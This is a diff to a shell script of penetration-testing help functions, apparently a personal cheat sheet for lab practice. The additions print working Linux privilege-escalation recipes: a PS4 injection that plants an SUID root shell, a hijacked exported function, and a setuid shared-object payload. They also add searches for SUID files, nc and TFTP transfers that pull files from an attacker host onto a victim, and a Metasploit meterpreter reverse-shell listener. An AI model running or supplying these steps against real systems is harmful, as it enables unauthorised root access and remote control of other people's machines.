@@ -79,6 +79,66 @@ function help-tmux {
 
 }
 
+function help-privesc-bash {
+echo "Note: This will not work on Bash versions 4.4 and above."
+echo ""
+echo "When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements."
+echo ""
+echo "Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:"
+echo "env -i SHELLOPTS=xtrace PS4='\$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2"
+echo ""
+echo "/tmp/rootbash -p"
+echo ""
+
+}
+
+function help-privesc-function {
+echo "In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path."
+echo ""
+echo "Verify the version of Bash installed on the Debian VM is less than 4.2-048:"
+echo ""
+echo "/bin/bash --version"
+echo ""
+echo "Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:"
+echo ""
+cat << EOF
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+}
+EOF
+}
+
+function help-privesc-shared-object {
+
+cat << EOF
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+        setuid(0);
+        system("/bin/bash -p");
+    }
+
+EOF
+echo gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c 
+
+cat << EOF
+int main() {
+        setuid(0);
+                system("/bin/bash -p");
+            }
+
+EOF
+
+echo "gcc -o service /home/user/tools/suid/service.c"
+
+}
+
+
+
 function help-john () {
     help-cracking
 }
@@ -277,6 +337,24 @@ function help-filetransfer-http {
     # axel 
     axel -a -n 20 -o report_axel.pdf https://www.someplace.com /reports/-sample-report-2013.pdf
 
+    # nc
+    nc -lvp 6666 < getr00t.c
+    
+    # tftp
+    TFTP
+
+    In Kali, create /tftpboot/ directory specifically only for TFTP daemon service -- Setup TFTP on Attacker Machine
+
+    atftpd –daemon –port 69 <directory>
+    service atftpd start
+    cp <file> /tftpboot/
+
+    Command on victim machine
+
+    tftp -i <ip address of attacker> GET <file name>
+
+
+
 EOF
 }
 
@@ -301,6 +379,12 @@ EOF
 
 echo ${red}${bold}Execute $reset
 echo ${green}ftp -v -n -s:ftp.txt $reset
+echo ""
+cat << "EOF"
+apt-get install pure-ftpd
+setup-ftp
+username: myuser, pswd: lab
+EOF
 }
 
 function help-filetransfer-tftp {
@@ -432,6 +516,12 @@ echo "use auxiliary/scanner/http/dir_scanner"
 echo "set RHOSTS 10.0.0.27"
 echo "set RPORT 1234"
 echo "run"
+echo ""
+echo "use multi/handler"
+echo "set payload windows/meterpreter/reverse_tcp"
+echo "set LHOST tun0"
+echo "set LPORT 6666"
+echo "exploit"
 
 }
 
@@ -480,6 +570,16 @@ echo ${reset}${green}
 echo "telnet 10.10.10.10 port"
 echo
 }
+
+function help-findsuid {
+echo "find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null"
+echo ""
+echo "find / -type f -perm -4000 2>/dev/null"
+echo ""
+echo "find / -type f -perm -2000 2>/dev/null"
+
+}
+
 
 function help-smb {
 echo ${red}${bold}
